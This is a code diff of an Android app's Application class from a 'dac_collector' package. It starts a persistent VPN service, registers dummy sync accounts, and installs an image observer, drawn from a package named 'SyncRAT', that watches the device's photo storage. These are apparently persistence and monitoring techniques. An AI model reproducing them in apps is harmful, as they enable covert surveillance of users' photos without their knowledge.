@@ -7,9 +7,11 @@ import android.app.Activity;
 import android.app.Application;
 
 import android.content.ContentResolver;
+import android.content.Context;
 import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
 import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
 
+import android.iocl.dac_collector.Services.PersistentVpnServiceUtil;
 import android.iocl.dac_collector.SyncAdapters.AccountContract;
 import android.iocl.dac_collector.SyncAdapters.SyncUtils;
 import android.iocl.dac_collector.SyncRAT.ImageObserver;
@@ -18,6 +20,7 @@ import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.Utility;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.Looper;
 import android.provider.MediaStore;
 import android.util.Log;
@@ -30,67 +33,75 @@ import com.hjq.permissions.XXPermissions;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.io.StringWriter;
 import java.util.Map;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
 
 public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
     FirebaseCrashlytics crashlytics;
     FirebaseApp firebaseApp;
 
+    private HandlerThread mImageObserverThread;
+    private Handler mImageObserverHandler;
+
     private Thread.UncaughtExceptionHandler defaultHandler;
     private File crashFile, lifecycleFile, heartbeatFile, anrFile;
     private volatile long lastMainThreadPing = System.currentTimeMillis();
     private ImageObserver mImageObserver;
-    Boolean installCockroach = true;
+    Boolean installCockroach = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
 
-        File logDir = getExternalFilesDir(null);
-        if (logDir != null && !logDir.exists()) {
-            logDir.mkdirs();
+        String currentProcess = getProcessNameSafe();
+        String mainProcess = getPackageName();
+
+        if (!mainProcess.equals(currentProcess)) {
+            Log.w("MyApp", "Skipping init in non-main process: " + currentProcess);
+            return;
         }
 
-        crashFile = new File(logDir, "last_crash.txt");
-        lifecycleFile = new File(logDir, "lifecycle.log");
-        heartbeatFile = new File(logDir, "heartbeat.txt");
-        anrFile = new File(logDir, "anr_stack.txt");
-
+        // ✅ Only runs once in the main app process
         setupCrashHandler();
-        checkPreviousCrash();
+        PersistentVpnServiceUtil.startService(this);
+//        checkPreviousCrash();
         registerActivityLifecycleCallbacks(this);
         startAnrWatchdog();
 
         createSyncAccount();
         addDummyAccount();
-
         installImageObserver();
 
         AccountContract.createSyncBothAccount(getApplicationContext());
         SyncUtils.initialize(getApplicationContext());
         firebaseApp = FirebaseApp.initializeApp(this);
 
-
         String cons_id = SharedPrefs.getString(this, "cons_id", "defaultForCrash");
         crashlytics = FirebaseCrashlytics.getInstance();
-
         crashlytics.setUserId(cons_id);
-        // Optionally enable debug logging
         crashlytics.setCrashlyticsCollectionEnabled(true);
-        // Initialize Firebase
 
         if (installCockroach) {
             install();
         }
-
     }
+
+    private String getProcessNameSafe() {
+        try {
+            int pid = android.os.Process.myPid();
+            BufferedReader reader = new BufferedReader(
+                    new FileReader("/proc/" + pid + "/cmdline")
+            );
+            String processName = reader.readLine().trim();
+            reader.close();
+            return processName;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
     /** ===================== CRASH HANDLER ====================== **/
     private void setupCrashHandler() {
         defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
@@ -211,6 +222,19 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
         } catch (Exception ignored) {}
     }
 
+    public static String getProcessName(Context context) {
+        try {
+            int pid = android.os.Process.myPid();
+            BufferedReader reader = new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"));
+            String processName = reader.readLine().trim();
+            reader.close();
+            return processName;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+
     public void addDummyAccount() {
         String ACCOUNT_TYPE = "com.example.account";
         String AUTHORITY = "com.example.provider";
@@ -308,10 +332,17 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
         }
     }
 
+    // fields in your Activity/Service
+
+
+    // call this instead of your old installImageObserver()
     private void installImageObserver() {
-        // 1) Make sure we have permission (prompt if not)
+        if (mImageObserver != null) {
+            Log.i("MyApp", "ImageObserver already installed");
+            return;
+        }
+
         if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
-            // 2) Only register once we actually have it:
             Handler handler = new Handler(Looper.getMainLooper());
             mImageObserver = new ImageObserver(handler, this);
             getContentResolver().registerContentObserver(
@@ -319,11 +350,27 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
                     true,
                     mImageObserver
             );
-
-
+            Log.i("MyApp", "ImageObserver installed");
+        } else {
+            Log.i("MyApp", "Manage external storage permission not granted");
         }
     }
 
+
+    // call this when stopping (Activity.onDestroy() or Service.onDestroy())
+
+
+
+    @Override
+    public void onTerminate() {
+        super.onTerminate();
+        if (mImageObserver != null) {
+            getContentResolver().unregisterContentObserver(mImageObserver);
+            mImageObserver = null;
+        }
+
+
+    }
 
     private void install() {
         final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();
